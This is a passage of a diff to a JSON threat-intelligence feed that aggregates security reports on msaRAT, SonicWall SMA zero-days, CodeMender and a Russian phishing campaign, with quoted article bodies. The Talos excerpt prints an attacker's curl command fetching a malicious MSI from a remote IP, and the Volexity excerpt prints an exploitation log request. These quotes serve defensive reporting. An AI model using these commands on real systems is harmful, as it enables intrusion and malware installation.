(msaRAT) msaRAT is written in Rust and implemented using the asynchronous runtime Tokio. Its primary capabilities include browser-leveraged reverse shell and covert tunneling to establish communications with a C2 server. The export table of “lib.dll” exposes a function named RUN , which is designed to be called by the installer described above. Based on the actual logs, after downloading this malware, we have confirmed the existence of a ransom note. Tokio runtime initialization Tokio is a runtime for exec",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "phishing_social_eng",
+            "data_breach"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [
+            "Cisco"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {
+            "Cisco": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Cisco Talos",
+          "cohort": "threat_research_primary",
+          "title": "Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel",
+          "link": "https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/",
+          "published": "2026-07-23T10:00:38+00:00",
+          "summary": "The Chaos ransomware group uses new malware \"msaRAT\" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "phishing_social_eng",
+              "data_breach"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Cisco"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {
+              "Cisco": "target"
             },
             "weak_tags": {
               "products": []
@@ -4704,26 +4754,32 @@
       ]
     },
     {
-      "cluster_id": "a1940e8772",
+      "cluster_id": "95bdd31efb",
       "priority_score": 10,
       "member_count": 1,
       "corroborating_source_count": 1,
-      "strong_signals": [],
+      "strong_signals": [
+        "SonicWall"
+      ],
       "taxonomy": {
         "threat_categories": [
-          "data_breach",
-          "phishing_social_eng",
-          "ransomware_extortion"
+          "web_shell_backdoor",
+          "zero_day"
         ],
         "actor_attribution": [],
         "affected_industries": [],
         "affected_products": [
-          "Cisco"
+          "SonicWall"
         ],
         "tools_used": [],
-        "cve_ids": [],
+        "cve_ids": [
+          "CVE-2026-15409",
+          "CVE-2026-15410"
+        ],
         "attack_techniques": [],
-        "urgency_signals": [],
+        "urgency_signals": [
+          "zero_day"
+        ],
         "content_type": [
           "news_report"
         ],
@@ -4732,33 +4788,37 @@
         ]
       },
       "primary": {
-        "source": "Cisco Talos",
+        "source": "Volexity",
         "cohort": "threat_research_primary",
-        "title": "Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel",
-        "link": "https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/",
-        "published": "2026-07-23T10:00:38+00:00",
-        "summary": "The Chaos ransomware group uses new malware \"msaRAT\" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.",
-        "full_body": "Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel By Jordyn Dunk , Michael Szeliga , Takahiro Takeda Thursday, July 23, 2026 06:00 ransomware RAT Cisco Talos has discovered a new Rust-based remote access trojan (RAT) we call “msaRAT” attributed to the Chaos ransomware group. The name is derived from the binding names found in the binary: “msaOpen,” “msaClose,” “msaError,” and “msaMessage”. msaRAT is implemented using the Tokio asynchronous runtime, with primary capabilities of browser-leveraged remote code execution and covert tunneling to establish command-and-control (C2) communications. This RAT never touches the network directly — it controls its C2 communication channel exclusively through Chrome DevTools Protocol (CDP), a browser debugging API. The binary contains a Cloudflare Workers endpoint, but it never makes HTTP connections to that domain itself; it offloads that work entirely to the browser. msaRAT manipulates the browser via CDP, performs signaling (SDP Offer/Answer exchange) with Cloudflare Workers, and establishes a WebRTC DataChannel between the browser and the C2 server using Twilio TURN (Traversal Using Relays around NAT) as a relay. Overview of Chaos ransomware Chaos is a ransomware-as-a-service (RaaS) group whose activity was first confirmed in February 2025. Although the number of listings on their data leak site remains relatively low, the group consistently targets large organizations and employs double extortion tactics. For initial access, they rely on spam emails and voice-based social engineering, commonly known as vishing. Once inside a network, their traditional post-compromise methodology involves abusing remote monitoring and management (RMM) tools to establish persistent access, while leveraging legitimate file-sharing software to exfiltrate data. For a detailed breakdown of their tactics, techniques, and procedures (TTPs), please refer to our previous blog. Figure 1. Chaos ransomware leak site. Infection chain Talos has identified a new Rust-based RAT used by the Chaos ransomware group, which we have named msaRAT. The name is derived from the binding names found in the binary (“msaOpen,” “msaClose,” “msaError,” “msaMessage”), as detailed in a later section. Figure 2 illustrates the end-to-end infection chain, from initial compromise through to the establishment of C2 communications via this RAT. Figure 2. Infection chain. After gaining access to a victim machine but prior to executing the ransomware, the attacker runs the following curl command to download an MSI file named “update_ms.msi” from an attacker-controlled server to the ProgramData directory on the victim machine, then executes it. Although port 443 is specified, the communication occurs over plain HTTP. In environments where firewall rules permit traffic based solely on port number without protocol inspection, this traffic will pass through undetected. curl.exe http://172.86.126.18:443/update_ms.msi -o C:\\programdata\\update_ms.msi The property information of this installer, which extracts the DLL file containing the RAT payload, contains details configured to impersonate a Windows update. Figure 3. Properties of “update_ms.msi” When this MSI file is executed, the custom action CA_Run_EA2AEBC3 is triggered upon completion of InstallFinalize . This custom action loads lib.dll, embedded in the MSI file's Binary table as Bin_lib_EA2AEBC3 , directly into memory. Figure 4. Structure of the MSI file. lib.dll (msaRAT) msaRAT is written in Rust and implemented using the asynchronous runtime Tokio. Its primary capabilities include browser-leveraged reverse shell and covert tunneling to establish communications with a C2 server. The export table of “lib.dll” exposes a function named RUN , which is designed to be called by the installer described above. Based on the actual logs, after downloading this malware, we have confirmed the existence of a ransom note. Tokio runtime initialization Tokio is a runtime for exec",
+        "title": "Proxying to Compromise: SonicWall Secure Mobile Access 0-day Exploitation",
+        "link": "https://www.volexity.com/blog/2026/07/17/proxying-to-compromise-sonicwall-secure-mobile-access-0-day-exploitation/",
+        "published": "2026-07-17T22:10:37+00:00",
+        "summary": "In early July 2026, Volexity was engaged to perform an incident response investigation where it discovered a threat actor had successfully compromised SonicWall Secure Mobile Access (SMA) VPN appliances through […] The post Proxying to Compromise: SonicWall Secure Mobile Access 0-day Exploitation appeared first on Volexity .",
+        "full_body": "Threat Intelligence Proxying to Compromise: SonicWall Secure Mobile Access 0-day Exploitation July 17, 2026 Sean Koessel and Steven Adair In early July 2026, Volexity was engaged to perform an incident response investigation where it discovered a threat actor had successfully compromised SonicWall Secure Mobile Access (SMA) VPN appliances through a chain of multiple zero-day exploits in the devices . The initial compromise was discovered after suspect authentication and lateral movement attempts were observed from the SonicWall SMA appliances. Following public disclosure by SonicWall on July 14, 2026 , Volexity is now able to share details on the exploits used, when they were used, and what the threat actor did with their access. The exploited vulnerabilities were found to affect SonicWall SMA 1000 series device models 6210, 7210, 8200v. The following vulnerabilities were patched through a hotfix earlier this week and included in versions 12.4.3-03453 and 12.5.0-02835 of the appliance: CVE-2026-15409 (SSRF) CVE-2026-15410 (Command Injection) At the beginning of the investigation, Volexity initially worked with available security telemetry and logs exported from two impacted appliances. However, the organization was able to provide Volexity with administrative SSH access to the VPN appliances a short time later. Using SSH access to the devices, Volexity collected system memory (RAM) with Volexity Surge Collect Pro , and gathered select files and full disk images. During the initial triage, Volexity identified disk artifacts that immediately confirmed both devices were compromised. The memory sample was then further analyzed with Volexity Volcano . Volexity’s analysis of logs, disk images, and memory led to the discovery of a threat actor Volexity tracks as UTA0533 . This threat actor was observed using multiple zero-day exploits, malware designed specifically for SonicWall SMA VPN appliances, as well as other attacker tradecraft. Volexity notes that June 22, 2026 , was the earliest sign of compromise observed in the investigation. Details of Volexity’s analysis of UTA0533’s operations, including the vulnerability workflow used to achieve remote code execution and the malware discovered, are detailed in the sections below. Log Analysis and Key IOCs Volexity initially worked with logs exported from the SonicWall SMA VPN appliances. These logs provided the full basis for investigating the intrusion to find most of the exploits used. However, using logs alone without a confirmed system-level compromise or accounting of on-system activity can make it difficult to connect all of the dots or prove what happened. Fortunately, Volexity was able to gather all the evidence needed and pieced together the entire workflow (and more) as described later in this post. There were various log files that provided clear signs of suspicious activity and compromise. Examples of the key log sources and what indicators of compromise (IOCs) look like are noted below. Note: Trivial details in the log files have been modified by Volexity for anonymization purposes. /var/log/aventail/extraweb_access.log The log captures the external web interaction with the SonicWall SMA VPN appliances. This includes the initial authentication bypass and SSRF via /wsproxy . Further, interactions with the observed backdoor/webshells was also recorded in this log. Checking logs for entries similar to those below are strong indicators of targeting and potential compromise. Exploitation Note the access to /wsproxy , with a bmID value starting with -3389 , a set serviceType , and the host set to 0.0.0.0 (or similar value aimed at internal services). The use of ports 1050 (Couch DB) and 8188 (Control Service) were seen throughout the investigation. Also, note the status codes of 101, indicating a successful protocol upgrade (to WebSockets). x.x.x.x - - [28/Jun/2026:23:19:17 -0000] \"GET /wsproxy?bmID=-3389f61b21f4&serviceType=SSH&host=0.0.0.0&port=1050 HTTP/1.1\" 101 - \"-\" - x.x.x",
         "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
-            "ransomware_extortion",
-            "phishing_social_eng",
-            "data_breach"
+            "zero_day",
+            "web_shell_backdoor"
           ],
           "actor_attribution": [],
           "affected_industries": [],
           "affected_products": [
-            "Cisco"
+            "SonicWall"
           ],
           "tools_used": [],
-          "cve_ids": [],
+          "cve_ids": [
+            "CVE-2026-15409",
+            "CVE-2026-15410"
+          ],
           "attack_techniques": [],
-          "urgency_signals": [],
+          "urgency_signals": [
+            "zero_day"
+          ],
           "content_type": "news_report",
           "confidence_tier": "tier_1_primary_research",
           "role_map": {
-            "Cisco": "target"
+            "SonicWall": "target"
           },
           "weak_tags": {
             "products": []
@@ -4767,31 +4827,35 @@
       },
       "corroborating_sources": [
         {
-          "source": "Cisco Talos",
+          "source": "Volexity",
           "cohort": "threat_research_primary",
-          "title": "Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel",
-          "link": "https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/",
-          "published": "2026-07-23T10:00:38+00:00",
-          "summary": "The Chaos ransomware group uses new malware \"msaRAT\" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.",
+          "title": "Proxying to Compromise: SonicWall Secure Mobile Access 0-day Exploitation",
+          "link": "https://www.volexity.com/blog/2026/07/17/proxying-to-compromise-sonicwall-secure-mobile-access-0-day-exploitation/",
+          "published": "2026-07-17T22:10:37+00:00",
+          "summary": "In early July 2026, Volexity was engaged to perform an incident response investigation where it discovered a threat actor had successfully compromised SonicWall Secure Mobile Access (SMA) VPN appliances through […] The post Proxying to Compromise: SonicWall Secure Mobile Access 0-day Exploitation appeared first on Volexity .",
           "taxonomy": {
             "threat_categories": [
-              "ransomware_extortion",
-              "phishing_social_eng",
-              "data_breach"
+              "zero_day",
+              "web_shell_backdoor"
             ],
             "actor_attribution": [],
             "affected_industries": [],
             "affected_products": [
-              "Cisco"
+              "SonicWall"
             ],
             "tools_used": [],
-            "cve_ids": [],
+            "cve_ids": [
+              "CVE-2026-15409",
+              "CVE-2026-15410"
+            ],
             "attack_techniques": [],
-            "urgency_signals": [],
+            "urgency_signals": [
+              "zero_day"
+            ],
             "content_type": "news_report",
             "confidence_tier": "tier_1_primary_research",
             "role_map": {
-              "Cisco": "target"
+              "SonicWall": "target"
             },
             "weak_tags": {
               "products": []
@@ -5164,112 +5228,6 @@
       ]
     },
     {
-      "cluster_id": "1258d35e57",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "zero_day"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "government"
-        ],
-        "affected_products": [
-          "Google/Gemini"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "poc_available",
-          "zero_day"
-        ],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "Help Net Security",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Google gives developers an AI bug hunter that also writes patches",
-        "link": "https://www.helpnetsecurity.com/2026/07/24/google-codemender-ai-agent-code-security/",
-        "published": "2026-07-24T08:53:17+00:00",
-        "summary": "Google has launched a preview of CodeMender, an AI agent built to scan code for security flaws, confirm they are exploitable, and generate fixes for developers to review. (Source: Google) The company describes it as a response to attackers who are already using AI to speed up their work, arguing that defenders need automation that moves at the same speed. “CodeMender can help you advance from passive scanning to automated code remediation, and reduce zero-day … More → The post Google gives developers an AI bug hunter that also writes patches appeared first on Help Net Security .",
-        "full_body": "Sinisa Markovic , Managing Editor, Help Net Security July 24, 2026 Share Google gives developers an AI bug hunter that also writes patches Google has launched a preview of CodeMender, an AI agent built to scan code for security flaws, confirm they are exploitable, and generate fixes for developers to review. (Source: Google) The company describes it as a response to attackers who are already using AI to speed up their work, arguing that defenders need automation that moves at the same speed. “CodeMender can help you advance from passive scanning to automated code remediation, and reduce zero-day risk,” Google said. CodeMender is now available through Gemini Enterprise Agent Platform, using Google’s generally available Gemini models, or as a component of AI Threat Defense, Google’s AI-powered security platform. A separate version paired with Gemini 3.5 Flash Cyber is limited to a small number of governments and trusted partners, with Google planning to expand access over time. Google plans to support third-party frontier models later this year. “We’ve fine-tuned CodeMender’s harness to be continuously updated with the latest Google DeepMind research, including the up-to-date agent skills, security tools, and system prompts,” the company explained. “Operating in the secure-by-design Agent Platform, CodeMender is protected by enterprise-grade, built-in governance and security guardrails, including secure traffic routing through your VPC, data isolation and encryption, and zero retention of source code data,” Google added. How the agent works CodeMender runs in three stages. It first scans repositories for vulnerabilities that static tools often miss, including memory corruption, injection flaws, web security issues, cryptographic weaknesses, and insecure data handling. It supports C/C++, Go, Java, Python, Ruby, Rust, and TypeScript. Second, it tries to confirm a flaw is worth acting on. Rather than stopping at a pattern match, CodeMender builds a proof-of-concept exploit and runs it in a sandbox the customer controls, a step Google says cuts down on false positives. Once a flaw is confirmed, the agent writes a patch and checks it with a model acting as judge, meant to catch cases where a fix breaks something else in the application. The patch reaches a developer as a code diff, and no change reaches a repository without manual approval. When deployed within AI Threat Defense, CodeMender works alongside Wiz to link vulnerabilities with deployment context and trigger automated penetration testing. “CodeMender is a critical step towards a continuous, self-healing agentic software development lifecycle, a future where code is autonomously secured, validated, and patched before it ever hits production,” the company concluded . More about AI code cybersecurity Google vulnerability management Share",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "zero_day"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "government"
-          ],
-          "affected_products": [
-            "Google/Gemini"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "zero_day",
-            "poc_available"
-          ],
-          "content_type": "news_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {
-            "Google/Gemini": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Help Net Security",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Google gives developers an AI bug hunter that also writes patches",
-          "link": "https://www.helpnetsecurity.com/2026/07/24/google-codemender-ai-agent-code-security/",
-          "published": "2026-07-24T08:53:17+00:00",
-          "summary": "Google has launched a preview of CodeMender, an AI agent built to scan code for security flaws, confirm they are exploitable, and generate fixes for developers to review. (Source: Google) The company describes it as a response to attackers who are already using AI to speed up their work, arguing that defenders need automation that moves at the same speed. “CodeMender can help you advance from passive scanning to automated code remediation, and reduce zero-day … More → The post Google gives developers an AI bug hunter that also writes patches appeared first on Help Net Security .",
-          "taxonomy": {
-            "threat_categories": [
-              "zero_day"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "government"
-            ],
-            "affected_products": [
-              "Google/Gemini"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "zero_day",
-              "poc_available"
-            ],
-            "content_type": "news_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "Google/Gemini": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "ac9cea3220",
       "priority_score": 10,
       "member_count": 1,
@@ -5379,19 +5337,142 @@
       ]
     },
     {
-      "cluster_id": "14cb190760",
+      "cluster_id": "1186a44566",
       "priority_score": 10,
+      "member_count": 3,
+      "corroborating_source_count": 2,
+      "strong_signals": [
+        "GitHub"
+      ],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "GitHub",
+          "Packagist",
+          "cPanel"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report",
+          "vulnerability_disclosure"
+        ],
+        "confidence_tier": [
+          "tier_4_news",
+          "tier_5_chatter"
+        ]
+      },
+      "primary": {
+        "source": "Reddit r/netsec",
+        "cohort": "reddit_practitioner_osint",
+        "title": "GitHub issues $100,000 bounty for critical RCE vulnerability",
+        "link": "https://www.reddit.com/r/netsec/comments/1v3v5za/github_issues_100000_bounty_for_critical_rce/",
+        "published": "2026-07-22T22:21:24+00:00",
+        "summary": "submitted by /u/ryanmerket [link] [comments]",
+        "full_body": "",
+        "fetch_status": "fetch_failed:HTTPError",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [
+            "GitHub"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "vulnerability_disclosure",
+          "confidence_tier": "tier_5_chatter",
+          "role_map": {
+            "GitHub": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Reddit r/netsec",
+          "cohort": "reddit_practitioner_osint",
+          "title": "GitHub issues $100,000 bounty for critical RCE vulnerability",
+          "link": "https://www.reddit.com/r/netsec/comments/1v3v5za/github_issues_100000_bounty_for_critical_rce/",
+          "published": "2026-07-22T22:21:24+00:00",
+          "summary": "submitted by /u/ryanmerket [link] [comments]",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "GitHub"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_5_chatter",
+            "role_map": {
+              "GitHub": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "The Hacker News",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Attackers Weaponize GitHub Actions Runners to Target cPanel and WHM Servers",
+          "link": "https://thehackernews.com/2026/07/attackers-weaponize-github-actions.html",
+          "published": "2026-07-23T11:28:54+00:00",
+          "summary": "Cybersecurity researchers have shed light on a large-scale campaign that has turned compromised GitHub repositories into distributed attack infrastructure designed to target cPanel and WebHost Manager (WHM) instances. The activity involves malicious Packagist development versions spanning 10 packages associated with a legitimate PHP and DevOps developer, dinushchathurya, between July 12 and 13,",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "GitHub",
+              "cPanel",
+              "Packagist"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "GitHub": "target",
+              "cPanel": "target",
+              "Packagist": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "574ebfebeb",
+      "priority_score": 9,
       "member_count": 1,
       "corroborating_source_count": 1,
       "strong_signals": [],
       "taxonomy": {
         "threat_categories": [
-          "ransomware_extortion"
+          "apt_espionage",
+          "phishing_social_eng"
         ],
-        "actor_attribution": [
-          "LockBit"
-        ],
+        "actor_attribution": [],
         "affected_industries": [
+          "critical_infrastructure",
           "education",
           "government"
         ],
@@ -5401,30 +5482,30 @@
         "attack_techniques": [],
         "urgency_signals": [],
         "content_type": [
-          "incident_report"
+          "news_report"
         ],
         "confidence_tier": [
-          "tier_4_news"
+          "tier_1_government"
         ]
       },
       "primary": {
-        "source": "Infosecurity Magazine",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Ransomware Attacks Targeting Universities on the Rise",
-        "link": "https://www.infosecurity-magazine.com/news/university-ransomware-attacks-rise/",
-        "published": "2026-07-24T09:15:00+00:00",
-        "summary": "Comparitech’s analysis of incidents in the first half of 2026 finds that the emergence of The Gentlemen ransomware has resulted in surge in attacks against higher education",
-        "full_body": "Infosecurity Magazine Home » News » Ransomware Attacks Targeting Universities on the Rise Ransomware Attacks Targeting Universities on the Rise News 24 July 2026 Written by Danny Palmer Deputy Editor , Infosecurity Magazine Universities have found themselves in the firing line of cybercriminals, as ransomware attacks against higher education institutions have increased, analysis of recent incidents has revealed. According to the Comparitech’s Education Ransomware Roundup for the first half of 2026, the number of attacks against higher education providers between January and June increased by 8% when compared with the previous six months. The report, published on July 23 , pointed to the rise of The Gentlemen ransomware operation as a key factor in the surge of attacks against the sector. The group’s attacks on education increased 275% in the first half of 2026, compared with the second half of 2025, and 80% of the gang’s attacks against the education sector were against colleges and universities. The Comparitech figures put the number of ransomware attacks on the global education sector during the first half of 2026 at 104. Of these incidents, 36 were confirmed as ransomware by the victim. While the number of ransomware attacks against higher education has increased, the report also noted that the overall number of recorded incidents against the education sector has a whole has decreased. This is due to the number of attacks against primary and secondary schools decreasing by a quarter. However, this does not mean the ransomware problem has disappeared. \"This H1 report yet again emphasizes the impact one group can have on the threat landscape. While initially the dip in attacks makes for positive reading, further investigations reveal that this is largely due to one gang and its choice of target,” said Rebecca Moody, head of data research at Comparitech. “The Gentlemen has gained immense notoriety in recent months and, as our data shows, has focused on higher education institutions,” she added. US Education Most Targeted by Ransomware The Comparitech data also showcased how ransomware attacks against the education sector is a global issue. Establishments in the US were the biggest target for ransomware groups, with 34 confirmed victims, the UK and Brazil accounted for 13 and 8 victims respectively. Universities in 17 additional countries experienced at least one confirmed ransomware attack during the period. The prolific perpetrators of ransomware attacks against the education sector were The Gentlemen and Qilin , which accounted for 15 claimed attacks each, followed by LockBit , which claimed 9, then Interlock and Nova, which claimed 6 each. Read More: Why Ransomware Remains One of Cybersecurity’s Most Persistent and Costly Threats The report also noted that the median ransom demand issued to victim organizations in the education sector during the first half of 2026 stood at $420,620, up 53% from the second half of $275,000. The largest ransom demand during the period was a demand of $1.9m, issued following an attack on Mount Royal University in Canada. A month on from the attack, the university’s systems were still impacted and attackers claimed to have stolen over 10TB of data. “Last month's attack on Mount Royal University also serves as a stark reminder of the drastic and far-reaching consequences attacks on education continue to have and that system encryption and data theft aren't the only things to worry about,” said Moody. “The hackers also deleted entire drives of data, which hasn't just impeded the college's ability to recover from the attack but means some data may be completely unrecoverable, too,” she concluded. You may also like Government Agencies Falling Victim to Ransomware Daily, Warns Study News 17 July 2026 The Gentlemen Overtakes Qilin as Most Prolific Ransomware Threat News 17 July 2026 A New Ransomware Threat Actor Emerges Every Week, Warns Report News 21 July 2026 Major Increase in Ransomware Attacks T",
+        "source": "NCSC UK",
+        "cohort": "government_authoritative",
+        "title": "UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations",
+        "link": "https://www.ncsc.gov.uk/news/uk-and-partners-expose-russian-state-supported-actors-for-new-zero-click-phishing-campaign",
+        "published": "2026-07-23T12:00:00+00:00",
+        "summary": "GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign",
+        "full_body": "News Download & print article PDF Download & print article PDF UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign Russian state-supported actors develop new technique to target Western email platforms and gain persistent access to compromised networks Organisations provided with trusted advice and support to protect sensitive data in the face of evolving cyber threats Russian state-supported cyber actors have targeted Western organisations with a malicious campaign which uses a zero-click exploit coined “beehive” (or “ Ulej ”) to steal emails, the UK has warned. Today, the National Cyber Security Centre – a part of GCHQ – alongside cyber security agencies in 15 countries, has exposed activities of LAUNDRY BEAR, an advanced persistent threat group who specialise in the covert acquisition of email data. Since July 2025, LAUNDRY BEAR has successfully targeted and stolen sensitive email information from organisations that use Zimbra Collaboration Suite (ZCS) software. US organisations have been targeted in sectors including defence, government, education, energy, law enforcement, media, NGOs and technology. In a new joint advisory , the NCSC and partners warn LAUNDRY BEAR’s ongoing campaign is indicative of espionage and almost certainly carried out with Russian state support. Unlike traditional phishing campaigns, “beehive” allows the threat actors to gain extensive and sustained access to emails without requiring a user’s input. Instead of clicking a link or opening a file, the user only has to view a malicious email within a vulnerable version of the ZCS webmail service to be compromised. Organisations that use ZCS are urged to follow the mitigation advice, including to immediately patch vulnerabilities and improve network monitoring capabilities. The cyber agencies caution that it is likely “beehive” could be adapted to exploit other vulnerabilities. As more organisations update their ZCS software, it is very likely that the group will also look to target other email systems that Western organisations use. The NCSC recommends all UK organisations should sign up to the free Early Warning service for malicious network activity notifications. The government is committed to raising cyber resilience across the UK to protect businesses and safeguard growth. Earlier this month, businesses from every corner of the British economy joined a pledge publicly committing to strengthen their defences in the face of a fast-evolving threat. Today’s action shows we’re working hand-in-hand with our allies to expose Russian state-supported hackers targeting Western organisations. It’s particularly concerning that these thugs tested their methods on victims in Ukraine, before targeting members of NATO. Organisations across the UK should sign up to NCSC’s Early Warning service to ensure they can quickly secure their systems against similar activity. Security Minister, Dan Jarvis MBE This phishing campaign demonstrates how hostile actors will ruthlessly adapt techniques and exploit vulnerable technology in pursuit of their aims to steal sensitive information from Western organisations. With our international partners, we strongly encourage organisations to familiarise themselves with the ‘zero-click’ techniques described in the advisory which could be used against other platforms, and act on the mitigation advice. We will continue to call out malicious cyber activity supported by the Russian state and urge everyone to follow NCSC guidance to raise resilience, including steps to strengthen online account security. Beth Hopkins CMG, NCSC Chief Operating Officer The advisory highlights how these malicious cyber techniques were extensively trialled on Ukrainian victims before use against members of NATO, which is part of a growi",
         "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
-            "ransomware_extortion"
+            "phishing_social_eng",
+            "apt_espionage"
           ],
-          "actor_attribution": [
-            "LockBit"
-          ],
+          "actor_attribution": [],
           "affected_industries": [
             "government",
+            "critical_infrastructure",
             "education"
           ],
           "affected_products": [],
@@ -5432,8 +5513,8 @@
           "cve_ids": [],
           "attack_techniques": [],
           "urgency_signals": [],
-          "content_type": "incident_report",
-          "confidence_tier": "tier_4_news",
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_government",
           "role_map": {},
           "weak_tags": {
             "products": []
@@ -5442,21 +5523,21 @@
       },
       "corroborating_sources": [
         {
-          "source": "Infosecurity Magazine",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Ransomware Attacks Targeting Universities on the Rise",
-          "link": "https://www.infosecurity-magazine.com/news/university-ransomware-attacks-rise/",
-          "published": "2026-07-24T09:15:00+00:00",
-          "summary": "Comparitech’s analysis of incidents in the first half of 2026 finds that the emergence of The Gentlemen ransomware has resulted in surge in attacks against higher education",
+          "source": "NCSC UK",
+          "cohort": "government_authoritative",
+          "title": "UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations",
+          "link": "https://www.ncsc.gov.uk/news/uk-and-partners-expose-russian-state-supported-actors-for-new-zero-click-phishing-campaign",
+          "published": "2026-07-23T12:00:00+00:00",
+          "summary": "GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign",
           "taxonomy": {
             "threat_categories": [
-              "ransomware_extortion"
+              "phishing_social_eng",
+              "apt_espionage"
             ],
-            "actor_attribution": [
-              "LockBit"
-            ],
+            "actor_attribution": [],
             "affected_industries": [
               "government",
+              "critical_infrastructure",
               "education"
             ],
             "affected_products": [],
@@ -5464,8 +5545,8 @@
             "cve_ids": [],
             "attack_techniques": [],
             "urgency_signals": [],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_4_news",
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_government",
             "role_map": {},
             "weak_tags": {
               "products": []
@@ -5759,102 +5840,6 @@
             "threat_categories": [],
             "actor_attribution": [],
             "affected_industries": [],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_government",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "574ebfebeb",
-      "priority_score": 9,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "apt_espionage",
-          "phishing_social_eng"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "critical_infrastructure",
-          "education",
-          "government"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
